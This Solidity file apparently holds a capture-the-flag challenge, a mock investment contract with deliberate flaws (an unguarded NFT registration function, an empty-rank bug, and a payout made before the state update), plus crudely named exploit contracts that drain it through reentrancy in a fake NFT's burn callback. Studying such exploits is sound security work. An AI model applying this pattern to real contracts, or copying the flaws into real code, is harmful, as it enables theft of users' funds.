// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/console.sol";

// Bonus NFT for every investor
// Get one free with the first deposit, sell later for 100.000$ or more*
// After some holding time it can be burned for a bonus
interface IMegaMankiNFT {
    // Mint NFT to a new investor (called only by the Company)
    function mint(address to, uint tokenId) external;

    // Burn NFT to claim a bonus (called only by the Company)
    function burn(uint tokenId) external;

    function ownerOf(uint256 tokenId) external view returns (address);

    // Timestamp after which it's possible to burn NFT
    // The higher rank of NFT, the lower will be delay
    function burnUnlockTime(uint tokenId) external view returns (uint unlockTime);
}

// Welcome to our high-profitable investment company
// You can make one deposit from 0.01 to 0.05 and get percents for all your life!
// Also get a bonus NFT with your deposit
contract SeriousBusinessInvestment {
    address public owner;
    mapping(string => IMegaMankiNFT) public bonusNfts;
    uint public nftCounter = 1;
    enum NFT_USER_STATUS {NOT_GENERATED, GENERATED, BURNED}

    uint public MIN_DEPO = 10 ** 16;
    uint public MAX_DEPO = 5 * 10 ** 16;
    uint public NFT_BURN_REWARD = 3 * 10 ** 15;
    uint[4] public AMOUNT_STEPS = [2 * 10 ** 16, 3 * 10 ** 16, MAX_DEPO];
    string[3] public RANKS = ["bronze", "silver", "gold"];
    uint[3] public DAILY_PERCENTS = [2, 3, 5];
    
    mapping(address => Stake) public stakes;

    struct Stake {
        uint stake;
        uint nftId;
        string rank;
        NFT_USER_STATUS nftStatus;
        uint percent;
        uint lastTime;
    }

    constructor() payable {
        owner = msg.sender;
    }

    receive() external payable {}

    function pendingProfit() public view returns (uint) {
        Stake storage stake = stakes[msg.sender];
        require(stake.lastTime > 0, "At first you need to deposit!");
        uint fulldaysPast = (block.timestamp - stake.lastTime) / 1 days;
        return stake.percent / 100 * fulldaysPast * stake.stake;
    }

    function withdrawProfit() public {
        Stake storage stake = stakes[msg.sender];
        uint profit = pendingProfit();
        stake.lastTime = block.timestamp;
        payable(msg.sender).transfer(profit);
    }

    function deposit() payable public {
        require(msg.value >= MIN_DEPO, "You are unable to deposit less than MIN_DEPO");
        require(msg.value <= MAX_DEPO, "You are unable to deposit more than MAX_DEPO");
        Stake storage stake = stakes[msg.sender];
        require(stake.stake == 0, "One user can make only one deposit");
        stake.stake = msg.value;
        stake.lastTime = block.timestamp;
        for (uint i = 0; i < AMOUNT_STEPS.length; i++) { 
            if (msg.value < AMOUNT_STEPS[i]) {
                stake.rank = RANKS[i];
                stake.percent = DAILY_PERCENTS[i];
            }
        }
        console.log(stake.rank);
        stake.nftStatus = NFT_USER_STATUS.GENERATED;
        IMegaMankiNFT(bonusNfts[stake.rank]).mint(msg.sender, nftCounter++);
    }

    function claimNftReward(uint nftId) public {
        Stake storage stake = stakes[msg.sender];
        require(stake.nftStatus == NFT_USER_STATUS.GENERATED, "Nft for this user is already burnt or not created");
        require(nftId > 0, "Wrong token id");
        IMegaMankiNFT nft = bonusNfts[stake.rank];
        require(nft.ownerOf(nftId) == msg.sender, "This NFT doesn't belong to the caller");
        require(nft.burnUnlockTime(nftId) <= block.timestamp, "It's too early to burn NFT");
        console.log('balance left', address(this).balance);
        payable(msg.sender).transfer(NFT_BURN_REWARD);
        nft.burn(nftId);
        stake.nftStatus = NFT_USER_STATUS.BURNED;
    }

    function nftContractsInitializer(string memory rank, address nft) public {
        require(nft != address(0), "Zero NFT address!");
        require(address(bonusNfts[rank]) == address(0), "NFT for the rank is already initialized!");
        bonusNfts[rank] = IMegaMankiNFT(nft);
    }

    // This function is for some investment things
    function notRugPull() public {
        require(msg.sender == owner, "Only owner!");
        payable(owner).transfer(address(this).balance);
    }
}

contract TestMonki is IMegaMankiNFT {
    // Mint NFT to a new investor (called only by the Company)
    function mint(address to, uint tokenId) external {}

    // Burn NFT to claim a bonus (called only by the Company)
    function burn(uint tokenId) external {}

    function ownerOf(uint256 tokenId) external view returns (address) {
      return msg.sender;
    }

    // Timestamp after which it's possible to burn NFT
    // The higher rank of NFT, the lower will be delay
    function burnUnlockTime(uint tokenId) external view returns (uint unlockTime) {
      return 0;
    }
}

contract FuckingMonki {
    uint public NFT_BURN_REWARD = 3 * 10 ** 15;

    SBIEbalka ebalka;

    constructor(SBIEbalka _ebalka) {
      ebalka = _ebalka;
    }

    function mint(address to, uint tokenId) external {}

    function burn(uint tokenId) external {
      if (msg.sender.balance >= NFT_BURN_REWARD) {
        ebalka.ebatt();
      }
    }

    function ownerOf(uint256 tokenId) external view returns (address) {
      return address(ebalka);
    }

    function burnUnlockTime(uint tokenId) external view returns (uint unlockTime) {
      return 0;
    }
}

contract SBIEbalka {
  SeriousBusinessInvestment sbi;
  uint nftId;

  constructor(SeriousBusinessInvestment _sbi) payable {
    sbi = _sbi;
  }

  function pwn() external {
    prepare_ebatt();
    ebatt();
    withdraw();
  }

  function prepare_ebatt() public {
    FuckingMonki fuckingMonki = new FuckingMonki(this);
    sbi.nftContractsInitializer("", address(fuckingMonki));
    sbi.deposit{value: sbi.MAX_DEPO()}();
    nftId = sbi.nftCounter();
  }

  function ebatt() public {
    sbi.claimNftReward(nftId);
  }

  function withdraw() public {
    payable(msg.sender).transfer(address(this).balance);
  }

  receive() payable external {}
}